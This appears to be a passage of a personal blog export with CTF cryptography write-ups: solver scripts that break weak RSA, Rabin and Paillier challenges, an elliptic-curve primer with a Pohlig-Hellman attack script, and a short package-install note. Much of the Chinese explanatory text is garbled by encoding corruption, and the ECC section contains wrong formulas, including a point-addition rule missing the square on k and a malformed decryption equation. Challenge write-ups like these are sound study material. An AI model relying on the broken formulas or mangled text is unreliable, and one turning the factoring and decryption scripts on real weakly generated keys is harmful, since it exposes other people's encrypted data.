- k) == 0:</span></span><br><span class="line"><span class="comment">#         phi = (e2 * (n2 - leak2 + 1) + 1) // (e2 - k)</span></span><br><span class="line"><span class="comment">#         d2 = int(invert(e2, phi))</span></span><br><span class="line"><span class="comment">#         try:</span></span><br><span class="line"><span class="comment">#             m2 = pow(c2, d2, n2)</span></span><br><span class="line"><span class="comment">#             flag2 = (long_to_bytes(m2)[:14]).decode()</span></span><br><span class="line"><span class="comment">#             if flag2[4:5] == &#x27;-&#x27; and flag2[9:10] == &#x27;-&#x27;:</span></span><br><span class="line"><span class="comment">#                 print(flag2)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#         except:</span></span><br><span class="line"><span class="comment">#             pass</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ³•2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">K_phi = e2 * (n2 - leak2 + <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">d2 = <span class="built_in">int</span>(invert(e2, K_phi))</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2, d2, n2)</span><br><span class="line">flag2 = (long_to_bytes(m2)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chall 3</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c3 = <span class="number">54161995127842474543974770981473422085334044100057089719350274921419091368361244533281599379235907845996678762379778310924192757650322930707785543132446159092950451255660204858292974657119337026589911330412367633761103944916751660957776230135927005700707688661350641600954072696774954805514477330339449799540</span></span><br><span class="line">n3 = <span class="number">88207747624007183083381863279444163105330473097729276113333026679597864128605555600000789783468271680476780366740448641311570797876037993255307716167149079618302706650018518487351604778857406170722209469765782625409279109832638886179654096975665134276856272488090272822541461702907181545730309689190333058151</span></span><br><span class="line">leak3 = <span class="number">19596671928335648228117128090384865424885102632642665068992144783391306491716530155291726644158221224616817878768426330717188403310818678195631582453246848</span></span><br><span class="line"><span class="comment"># p3, q3 = var(&#x27;p3 q3&#x27;)</span></span><br><span class="line"><span class="comment"># sol3 = solve([p3 + q3 - leak3, p3 * q3 - n3], [p3, q3])</span></span><br><span class="line"><span class="comment"># print(sol3[1])</span></span><br><span class="line">p3 = <span class="number">12591119529483514723681507251180531324926419443874102860338530066728710197246719851038994673567739600391874839712324936583490370533180101117667257937826949</span></span><br><span class="line">q3 = <span class="number">7005552398852133504435620839204334099958683188768562208653614716662596294469810304252731970590481624224943039056101394133698032777638577077964324515419899</span></span><br><span class="line">m3 = Original_RSA(p3, q3, e3, c3, n3)</span><br><span class="line">flag3 = (long_to_bytes(m3)[:<span class="number">14</span>]).decode()</span><br><span class="line"><span class="built_in">print</span>(flag3)</span><br><span class="line"></span><br><span class="line">flag = flag1 + flag2 + flag3</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>



<h1 id="NSSCTF-round11-ez-signin"><a href="#NSSCTF-round11-ez-signin" class="headerlink" title="[NSSCTF-round11]ez_signin"></a>[NSSCTF-round11]ez_signin</h1><ul>
<li>basic</li>
<li>deduction</li>
<li>rabin</li>
</ul>
<p>$$<br>num1 \equiv p^e \mod n - q^e \mod n \equiv p^e - q^e \mod n<br>$$</p>
<p>åˆ©ç”¨äºŒé¡¹å¼å±•å¼€å®šç†å¯¹å…¶è¿›è¡Œå±•å¼€ä»¥åŠæ¨¡è¿ç®—ï¼š<br>$$<br>num2 \equiv (p + q)^e \mod n \equiv p^e + q^e \mod n<br>$$</p>
<p>{1}å¼ + {2}å¼å¯å¾—ï¼š<br>$$<br>num1 + num2 \equiv 2 p^e \mod n<br>$$<br>åˆä»é¢˜ç›®å¾—åˆ°$n &#x3D; p \times q$ï¼Œåˆ©ç”¨<code>gcd()</code>å¯å¾—<code>p</code>ï¼š<br>$$<br>p &#x3D; gcd(num1 + num2, n)<br>$$<br>è€Œ<code>q</code>å³ä¸º$q &#x3D; n &#x2F;&#x2F; p$.</p>
<p>å¾—åˆ°<code>p</code>ä»¥åŠ<code>q</code>åï¼Œå‘ç°$p\equiv q \equiv 3 \mod 4$ï¼Œè€Œ$e &#x3D; 65536 &#x3D; 2^{16}$ï¼Œå¯å¾—ä¸‹ä¸€ä¸ªçŸ¥è¯†ç‚¹ä¸º<code>Rabin</code>ç®—æ³•ï¼Œä¸”å¾ªç¯ä½¿ç”¨16æ¬¡ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å¯¹åŸå§‹çš„<code>c</code>å…ˆè¿›è¡Œä¸€æ¬¡<code>Rabin</code>ï¼Œæ‰€å¾—çš„å››ä¸ªæ˜æ–‡ä½œä¸º<code>c</code>ç»§ç»­å¾ªç¯ä½¿ç”¨<code>Rabin</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num1 = <span class="number">134186458247304184975418956047750205959249518467116558944535042073046353646812210914711656218265319503240074967140027248278994209294869476247136854741631971975560846483033205230015783696055443897579440474585892990793595602095853960468928457703619205343030230201261058516219352855127626321847429189498666288452</span></span><br><span class="line">num2 = <span class="number">142252615203395148320392930915384149783801592719030740337592034613073131106036364733480644482188684184951026866672011061092572389846929838149296357261088256882232316029199097203257003822750826537629358422813658558008420810100860520289261141533787464661186681371090873356089237613080052677646446751824502044253</span></span><br><span class="line">n = <span class="number">154128165952806886790805410291540694477027958542517309121222164274741570806324940112942356615458298064007096476638232940977238598879453357856259085001745763666030177657087772721079761302637352680091939676709372354103177660093164629417313468356185431895723026835950366030712541994019375251534778666996491342313</span></span><br><span class="line">c = <span class="number">9061020000447780498751583220055526057707259079063266050917693522289697419950637286020502996753375864826169562714946009146452528404466989211057548905704856329650955828939737304126685040898740775635547039660982064419976700425595503919207903099686497044429265908046033565745195837408532764433870408185128447965</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">p = gcd(num1 + num2, n)</span><br><span class="line">q = n // p</span><br><span class="line"><span class="keyword">assert</span> is_prime(p)</span><br><span class="line"><span class="keyword">assert</span> is_prime(q)</span><br><span class="line"><span class="keyword">assert</span> p % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="keyword">assert</span> q % <span class="number">4</span> == <span class="number">3</span></span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line"><span class="comment"># print(p.bit_length())</span></span><br><span class="line"><span class="comment"># print(q.bit_length())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 65536 == 2**16</span></span><br><span class="line">cs = [c]</span><br><span class="line"></span><br><span class="line">gcd, yp, yq = gcdext(p, q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> cc <span class="keyword">in</span> cs:</span><br><span class="line">        mp = powmod(cc, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        mq = powmod(cc, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line"></span><br><span class="line">        m1 = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">        m2 = n - m1</span><br><span class="line">        m3 = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">        m4 = n - m3</span><br><span class="line">        <span class="keyword">if</span> m1 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m1)</span><br><span class="line">        <span class="keyword">if</span> m2 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m2)</span><br><span class="line">        <span class="keyword">if</span> m3 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m3)</span><br><span class="line">        <span class="keyword">if</span> m4 <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(m4)</span><br><span class="line"></span><br><span class="line">    cs = ps</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;nss&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment"># nssctf&#123;W3lc0me_t0_nssctf_R0undll_w15h_U_can_have_Fun_t0day!!!#0919&#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="DASCTF2020-4-not-RSA"><a href="#DASCTF2020-4-not-RSA" class="headerlink" title="[DASCTF2020-4]not RSA"></a>[DASCTF2020-4]not RSA</h1><blockquote>
<p>relating: [ç½‘é¼æ¯2020åå—åŒºå¤èµ›]paillier</p>
</blockquote>
<ul>
<li>paillier-2</li>
</ul>
<p>$n$æ¯”è¾ƒå°ï¼Œç›´æ¥<code>yafu</code>åˆ†è§£æˆ–è€…è´¹é©¬åˆ†è§£éƒ½å¯ä»¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class="line">n = <span class="number">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># yafu</span></span><br><span class="line">p = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class="line">q = <span class="number">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class="line"></span><br><span class="line">L = <span class="keyword">lambda</span> x: (x - <span class="number">1</span>) // n</span><br><span class="line">lam = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">miu = invert(lam, n)</span><br><span class="line"></span><br><span class="line">m = L(<span class="built_in">pow</span>(c, <span class="built_in">int</span>(lam), n*n)) * miu % n</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="GKCTF2020-Backdoor"><a href="#GKCTF2020-Backdoor" class="headerlink" title="[GKCTF2020]Backdoor"></a>[GKCTF2020]Backdoor</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. cveæŸ¥çœ‹æ¼æ´ï¼Œå¯¹nè¿›è¡Œçˆ†ç ´ï¼Œæ±‚è§£p,q</span><br><span class="line">2. pub.pemæå–e,n flag.encæå–c</span><br><span class="line">3. ==&gt; Original_RSA()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=k*M+(65537**a %M)</span><br></pre></td></tr></table></figure>

<h2 id="p-x3D-k-times-M-65537-a-mod-M-BackdoorCVEæ±‚è§£p-q"><a href="#p-x3D-k-times-M-65537-a-mod-M-BackdoorCVEæ±‚è§£p-q" class="headerlink" title="$p &#x3D; k \times M + (65537^{a} mod M)$BackdoorCVEæ±‚è§£p,q"></a>$p &#x3D; k \times M + (65537^{a} mod M)$BackdoorCVEæ±‚è§£p,q</h2><blockquote>
<p><a href="https://asecuritysite.com/encryption/copper">https://asecuritysite.com/encryption/copper</a></p>
</blockquote>
<h1 id="NepCTF2022-ä¸­å­¦æ•°å­¦"><a href="#NepCTF2022-ä¸­å­¦æ•°å­¦" class="headerlink" title="[NepCTF2022]ä¸­å­¦æ•°å­¦"></a>[NepCTF2022]ä¸­å­¦æ•°å­¦</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ ¸å¿ƒç”Ÿæˆ</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p + (p &gt;&gt; <span class="number">500</span>))</span><br></pre></td></tr></table></figure>

<h2 id="q-x3D-next-prime-p-p-gt-gt-500"><a href="#q-x3D-next-prime-p-p-gt-gt-500" class="headerlink" title="q &#x3D; next_prime(p+(p&gt;&gt;500))"></a>q &#x3D; next_prime(p+(p&gt;&gt;500))</h2><p>è½¬æ¢æˆæ•°å­¦å…¬å¼$q &#x3D; p + \frac{1}{2^{500}}\cdot{p} + r &#x3D; (1 + \frac{1}{2^{500}})p + r$</p>
<p>æ­¤æ—¶ï¼š$r$ä¸ºå‡‘åˆ°ç´ æ•°çš„æœ€å°æ•´æ•°</p>
<h2 id="n-x3D-p-q"><a href="#n-x3D-p-q" class="headerlink" title="n &#x3D; p*q"></a>n &#x3D; p*q</h2><p>ä»£å…¥$q$å¾—åˆ°ï¼š<br>$$<br>n &#x3D; p\cdot q<br>$$</p>
<p>$$<br>n &#x3D; p\cdot((1+\frac{1}{2^{500}})p + r)<br>$$</p>
<p>$$<br>n &#x3D; (1+\frac{1}{2^{500}})\cdot p^{2} + r\cdot p<br>$$</p>
<h2 id="å‡‘å¹³æ–¹"><a href="#å‡‘å¹³æ–¹" class="headerlink" title="å‡‘å¹³æ–¹"></a>å‡‘å¹³æ–¹</h2><p>ç­‰å¼å·¦å³ä¸¤è¾¹åŒæ—¶ä¹˜ä¸Š$(1+\frac{1}{2^{500}})$ï¼Œå‡‘å‡ºå¹³æ–¹ï¼š<br>$$<br>(1+ \frac{1}{2^{500}})n &#x3D; ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp<br>\ &gt; ((1+\frac{1}{2^{500}})p)^{2}<br>$$</p>
<h2 id="è¿›è¡Œçº¦æŸè®¡ç®—"><a href="#è¿›è¡Œçº¦æŸè®¡ç®—" class="headerlink" title="è¿›è¡Œçº¦æŸè®¡ç®—"></a>è¿›è¡Œçº¦æŸè®¡ç®—</h2><p>$$<br>(1+ \frac{1}{2^{500}})n &#x3D; ((1+\frac{1}{2^{500}})p)^{2}+(1+\frac{1}{2^{500}})rp \tag1<br>$$</p>
<p>$$<br>q^{2} &#x3D; ((1+\frac{1}{2^{500}})p + r)^{2}&#x3D;((1+ \frac{1}{2^{500}})p)^{2} + (1+\frac{1}{2^{500}})rp + (1+\frac{1}{2^{500}})rp + r^{2} \tag2\<br>$$</p>
<p>æ˜¾ç„¶$(2)$å¤§äº$(1)$</p>
<h2 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h2><p>$$<br>(1+\frac{1}{2^{500}})p &lt; \sqrt{n(1+\frac{1}{2^{500}}}) &lt; (1+\frac{1}{2^{500}})p+r &#x3D; q<br>$$</p>
<p>æ­¤æ—¶<code>next_prime(iroot(n+(n&gt;&gt;500))[0])</code>ä¸º$q$ï¼Œç„¶åè½¬æ¢æˆåŸºç¡€RSAã€‚</p>
<h2 id="æ ¹æ®ç»“è®ºå¾—åˆ°qï¼Œè½¬æ¢æˆåŸºç¡€RSA"><a href="#æ ¹æ®ç»“è®ºå¾—åˆ°qï¼Œè½¬æ¢æˆåŸºç¡€RSA" class="headerlink" title="æ ¹æ®ç»“è®ºå¾—åˆ°qï¼Œè½¬æ¢æˆåŸºç¡€RSA"></a>æ ¹æ®ç»“è®ºå¾—åˆ°qï¼Œè½¬æ¢æˆåŸºç¡€RSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = next_prime(iroot(n+(n&gt;&gt;<span class="number">500</span>), <span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">p = n // q</span><br><span class="line"><span class="comment"># è½¬æ¢æˆåŸºç¡€RSA</span></span><br></pre></td></tr></table></figure>



<h1 id="NewStarCTF2022-RSA-begin"><a href="#NewStarCTF2022-RSA-begin" class="headerlink" title="[NewStarCTF2022]RSA_begin"></a>[NewStarCTF2022]RSA_begin</h1><h2 id="Level5-ppqå‹hint-x2F-ç®€å•æ•°å­¦æ¨å¯¼"><a href="#Level5-ppqå‹hint-x2F-ç®€å•æ•°å­¦æ¨å¯¼" class="headerlink" title="Level5-ppqå‹hint&#x2F;ç®€å•æ•°å­¦æ¨å¯¼"></a>Level5-ppqå‹hint&#x2F;ç®€å•æ•°å­¦æ¨å¯¼</h2><p>å·²çŸ¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = p * p * q</span><br><span class="line">N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(p)</span><br><span class="line">d = inverse(e, N)</span><br></pre></td></tr></table></figure>

<p>$$<br>c \equiv m^{e} \mod n<br>$$</p>
<p>$$<br>hint \equiv d^{e} \mod n<br>$$</p>
<p>$$<br>de \equiv 1 \mod \varphi(n)<br>$$</p>
<p><strong>æ ¹æ®å·²çŸ¥æ¡ä»¶è¿›è¡Œæ¨å¯¼</strong><br>$$<br>d^{e} &#x3D; hint + k_{1} \cdot p\ \tag{1}<br>$$</p>
<p>$$<br>d\cdot e &#x3D; 1 + k_{2}\cdot p \tag{2}<br>$$</p>
<p>é€šè¿‡<strong>åŒä½™æ€§</strong>å¯¹ï¼ˆ2ï¼‰å¼è¿›è¡Œå˜å½¢ï¼Œå¹¶ä»£å…¥ï¼ˆ1ï¼‰å¼<br>$$<br>(d\cdot e)^{e} &#x3D; 1 + k_{3}\cdot p \tag{3}<br>$$</p>
<p>$$<br>d^{e}\cdot e^{e} &#x3D; hint\cdot e^{e} + k_{4}\cdot p<br>$$</p>
<p>æ•´ç†å¾—ï¼ˆ5ï¼‰ï¼Œå³å·¦è¾¹å«$p$å› å­<br>$$<br>hint\cdot e^{e} - 1 &#x3D; k_{5}\cdot p \tag{5}<br>$$<br>åˆå› ä¸º$n &#x3D; p\cdot p\cdot q$</p>
<p>æ‰€ä»¥æœ€ç»ˆå¯å¾—åˆ°<br>$$<br>gcd(hint\cdot e^{e} - 1, n) &#x3D; p \tag{6}<br>$$<br>é€šè¿‡ï¼ˆ6ï¼‰ï¼Œå³å¯æŠŠå…³é”®å› ç´ $p$æ±‚è§£å‡ºæ¥ã€‚</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>recurrent</tag>
      </tags>
  </entry>
  <entry>
    <title>Environment Install</title>
    <url>/2023/07/20/Environment-Install/</url>
    <content><![CDATA[<p>Environment intsall about some problems and their solutions.</p>
<span id="more"></span><!--toc-->

<h1 id="opencv-python"><a href="#opencv-python" class="headerlink" title="opencv-python"></a>opencv-python</h1><blockquote>
<p>pip2 install</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple opencv-python==4.2.0.32</span><br></pre></td></tr></table></figure>



<h1 id="sklearn"><a href="#sklearn" class="headerlink" title="sklearn"></a>sklearn</h1><blockquote>
<p>pycharm-setting-Project Interpreter</p>
<p>sklearn â€“&gt;  scikit-learn</p>
</blockquote>
<ul>
<li>Numpy</li>
<li>Scipy</li>
<li>scikit-learn</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>23-01-11-ECC</title>
    <url>/2023/01/11/23-01-11-ECC/</url>
    <content><![CDATA[<p>Some basics about elliptic curves. Make a description about ECC, and show the attacks and conversions to code. </p>
<p>ECC is somewhat difficult, and also the analysis which is necessary ought to be detailed. </p>
<p>The ECC always connects to the usage of sagemath, this post also introduces some common usages about ECC in sagemath. </p>
<span id="more"></span><!--toc-->

<h1 id="PARALLEL"><a href="#PARALLEL" class="headerlink" title="PARALLEL"></a>PARALLEL</h1><p><strong>Assume:</strong> Parallel lines intersect at infinity which is called the infinity point <code>P</code>. (parallel and intersecting unity)</p>
<p>The properties of infinite <code>P</code>: </p>
<ul>
<li>The infinite <code>P</code> of Line L has only one.</li>
<li>The lines which are parallel to each other have the public infinite $P_{\infty}$. </li>
<li>Any lines which are intersect have different infinite points $P_{\infty}$s. (If they have public infinity,  it will contrary to assumption.)</li>
<li>All infinity points formulate a infinity line.</li>
<li>The total infinity points and all ordinary points in the plane form the projective plane.</li>
</ul>
<h1 id="PROJECTIVE-PLANE-COORDINATE-SYSTEM"><a href="#PROJECTIVE-PLANE-COORDINATE-SYSTEM" class="headerlink" title="PROJECTIVE PLANE COORDINATE SYSTEM"></a>PROJECTIVE PLANE COORDINATE SYSTEM</h1><p><strong>Formulate:</strong> Make $x &#x3D; X&#x2F;Z$, $y &#x3D; Y&#x2F;Z$, ($Z \neq 0$), and the Point <code>A</code> is $(X:Y:Z)$. </p>
<p>The infinity points are expressed as $(X:Y:0)$. The ordinary points is $Z \neq 0$,and the infinities are $Z &#x3D; 0$, meaning that the equation of infinity points is $Z &#x3D; 0$. </p>
<p>Thus, $(X:Y:Z)$ is called as projective plane coordinate system. </p>
<h1 id="ELLIPTIC-CURVE"><a href="#ELLIPTIC-CURVE" class="headerlink" title="ELLIPTIC CURVE"></a>ELLIPTIC CURVE</h1><p><strong>Definition:</strong>  The elliptic curve in projective plane satisfies the equation that $Y^2Z + a_1XYZ + a_3YZ^2 &#x3D; X^3 + a_2X^2Z + a_4XZ^2 + a_6Z^3$, or Weierstrass homogeneous equation $Y^2&#x3D;X^3+AX+B$, where the whole points are non-singular or smooth.</p>
<p> <strong>Non-singular&#x2F;Smooth:</strong> Mathematically, the partial derivatives $F_x(x,y,z), F_y(x,y,z),F_z(x,y,z)$ at any point on the curve cannot be 0 at same time, meaning that any point exists tangent. </p>
<p>Assume that $x &#x3D; X&#x2F;Z, y&#x3D; Y&#x2F;Z$ and substitute into the equation above, we can obtain $y^2 + a_1xy + a_3y &#x3D; x^3 + a_2x^2+a_4x+a_6$ and also the slope is $k &#x3D; (3x^2+2a_2x+a_4 - a_1y)&#x2F;(2y + a_1x+a_3)$. </p>
<img src="/2023/01/11/23-01-11-ECC/1_hashhash.png" class="" title="common ecc">

<p><em>Two curves below which are not satisfied the definition are not elliptic curves , and they are called Singular Curves.</em></p>
<h1 id="ALGORITHM-ON-AN-ELLIPTIC-CURVE"><a href="#ALGORITHM-ON-AN-ELLIPTIC-CURVE" class="headerlink" title="ALGORITHM ON AN ELLIPTIC CURVE"></a>ALGORITHM ON AN ELLIPTIC CURVE</h1><p><strong>Algorithm:</strong>  Arbitrarily take two points <code>P</code> and <code>Q</code> on the elliptic curve (if the two points <code>P</code> and <code>Q</code> coincide, then make the tangent of point <code>P</code>), make the line intersect the other point <code>R&#39;</code> of the elliptic curve, and cross <code>R&#39;</code> to make the parallel line of the y axis intersect the point <code>R</code>, we specify $P+Q &#x3D; R$.</p>
<img src="/2023/01/11/23-01-11-ECC/2_hashhash.png" class="" title="find R">

<p>The infinity $O_{\infty}$ and the point $P$ on the elliptic curve intersect at the point $P$. The action of of infinity $O_{\infty}$ is equivalent to 0, which is called the zero element. The equation is that $O_{\infty} + P &#x3D; P$. </p>
<p><strong>Deduction:</strong> </p>
<ul>
<li>Three points on elliptic curve are in the straight line $A + B + C &#x3D; O_{\infty}$. </li>
<li>The sum of $k$ identical points is denoted $kP$. eg: $P+P+P &#x3D; 2P+P &#x3D; 3P$</li>
</ul>
<p><strong>Notice:</strong> <em>Elliptic curves are not necessarily symmetric with respect to x-axis.</em></p>
<h1 id="ELLIPTIC-CURVE-IN-CRYPTOGRAPHY"><a href="#ELLIPTIC-CURVE-IN-CRYPTOGRAPHY" class="headerlink" title="ELLIPTIC CURVE IN CRYPTOGRAPHY"></a>ELLIPTIC CURVE IN CRYPTOGRAPHY</h1><p><strong>Discretization:</strong> Define elliptic curves on finite field. </p>
<p><strong>Algorithm:</strong> </p>
<ul>
<li><p>Finite field $F_p$ only has finite elements. </p>
</li>
<li><p>$F_p$ has $p$ elements. $F_p \in {0, 1, 2, 3, \dots, p-1}$</p>
</li>
<li><p>+:$a + b \equiv c \mod p$</p>
</li>
<li><p>Ã—:$a \times b \equiv c \mod p$</p>
</li>
<li><p>Ã·:$a \times b^{-1} \equiv c \mod p$</p>
</li>
<li><p>Unit element &#x3D; 1 ; Zero element &#x3D; 0</p>
</li>
</ul>
<p>The elliptic curves that are suitable for encryption: $y^2 &#x3D; x^3 + ax + b$. </p>
<p>The relationship among $P(x_1, y_1), Q(x_2, y_2)$ and $R(x_3, y_3)$: </p>
<ul>
<li>$x_3 \equiv k - x_1 - x_2 (\mod p)$</li>
<li>$y_3 \equiv k(x_1 - x_3) - y1(\mod p)$</li>
<li>$k$<ul>
<li>if $P &#x3D; Q$, the $k &#x3D; (3x^2 + a)&#x2F;2y_1$</li>
<li>if $P \neq Q$, the $k &#x3D; (y_2 - y_1)&#x2F;(x_2 - x_1)$</li>
</ul>
</li>
</ul>
<p>Point P exists the minimum positive integer $n$, which make $np &#x3D; O_{\infty}$, and we will call $n$ as the order of n. Otherwise, it is called infinite order. </p>
<p><em>n always exists.</em></p>
<h1 id="SIMPLE-ENCRYPTION-AND-DECRYPTION-ON-ELLIPTIC-CURVES"><a href="#SIMPLE-ENCRYPTION-AND-DECRYPTION-ON-ELLIPTIC-CURVES" class="headerlink" title="SIMPLE ENCRYPTION AND DECRYPTION ON ELLIPTIC CURVES"></a>SIMPLE ENCRYPTION AND DECRYPTION ON ELLIPTIC CURVES</h1><img src="/2023/01/11/23-01-11-ECC/3.png" class="" title="description">

<ul>
<li><p>A as the generator and decryptor. B as the encryptor. </p>
</li>
<li><p>A generates the basic parameters. The $(a, b)$ is to generate the elliptic curve. The $G$ is the chosen base point. Then, send $E_p(a, b), K, G$ to B.</p>
</li>
<li><p>B generates the random $r$. Make a encryption and send $C_1 &#x3D; M + rK,C_2 &#x3D; rG$ to A.</p>
</li>
<li><p>A decrypts the ciphers by the equation $M &#x3D; C1 - kG_2$. Finally, A will get message $M$. </p>
</li>
<li><p>PubKey: $K &#x3D; kG$</p>
</li>
<li><p>PriKey: $k$</p>
</li>
</ul>
<p>Common 6 parameters $F(p,a,b,G,n,h)$: </p>
<ul>
<li>$p, a, b \rightarrow E_p(a, b)$: $p$ 200 more digits can ensure the security. </li>
<li>$G$: the chosen base point of $E_p(a, b)$ </li>
<li>$n$: the order of $E_p(a, b)$</li>
<li>$h$: the cofactor and the integer part that $m$, the sum of all points on elliptic curve, divides $n$.</li>
</ul>
<h1 id="ATTACKs"><a href="#ATTACKs" class="headerlink" title="ATTACKs"></a>ATTACKs</h1><p>The important part. </p>
<p>Make some description about the common attacks on elliptic curves in cryptography.</p>
<h2 id="Pohlig-Hellman"><a href="#Pohlig-Hellman" class="headerlink" title="Pohlig-Hellman"></a>Pohlig-Hellman</h2><blockquote>
<p>The order of elliptic curve is factorized into small primes. </p>
</blockquote>
<p><strong>Main idea:</strong> </p>
<ol>
<li>Factorize the order. </li>
<li>Discrete logarithmic problems in factorized primes. </li>
<li>Chinese reminder theorem.</li>
</ol>
<p><strong>Deduction:</strong> </p>
<img src="/2023/01/11/23-01-11-ECC/4.png" class="" title="deduction">

<p><strong>Example:</strong> ECC-2</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># polig_hellman</span></span><br><span class="line">a2 = <span class="number">377999945830334462584412960368612</span></span><br><span class="line">b2 = <span class="number">604811648267717218711247799143415167229480</span></span><br><span class="line">p2 = <span class="number">1256438680873352167711863680253958927079458741172412327087203</span></span><br><span class="line">E2 = EllipticCurve(GF(p2), [a2, b2])</span><br><span class="line">P2 = E2(<span class="number">550637390822762334900354060650869238926454800955557622817950</span> ,<span class="number">700751312208881169841494663466728684704743091638451132521079</span> )</span><br><span class="line">Q2 = E2(<span class="number">1152079922659509908913443110457333432642379532625238229329830</span> , <span class="number">819973744403969324837069647827669815566569448190043645544592</span> )</span><br><span class="line"></span><br><span class="line">factors, exponents = <span class="built_in">zip</span>(*factor(P2.order()))</span><br><span class="line"><span class="comment"># print(factors)</span></span><br><span class="line"><span class="comment"># print(exponents)</span></span><br><span class="line">primes = [factors[i] ^ exponents[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(factors))][:-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(primes)</span></span><br><span class="line">dlogs = []</span><br><span class="line"><span class="keyword">for</span> fac <span class="keyword">in</span> primes:</span><br><span class="line">    t = <span class="built_in">int</span>(P2.order()) // <span class="built_in">int</span>(fac)</span><br><span class="line">    dlog = discrete_log(t*Q2, t*P2, operation = <span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">    dlogs += [dlog]</span><br><span class="line"><span class="comment"># print(dlogs)</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(primes) == <span class="built_in">len</span>(dlogs):</span><br><span class="line">    m2 = crt(dlogs, primes)</span><br><span class="line">flag2 = long_to_bytes(m2).decode()</span><br><span class="line"><span class="built_in">print</span>(flag2)</span><br></pre></td></tr></table></figure>

<h2 id="Smart-Attack"><a href="#Smart-Attack" class="headerlink" title="Smart Attack"></a>Smart Attack</h2><blockquote>
<p>$E(F_p) &#x3D; p$, the order of the elliptic curve is a prime. </p>
</blockquote>
<p><em>It will be updated, if I have time.</em></p>
<p><strong>Exp:</strong> ECC-3</p>
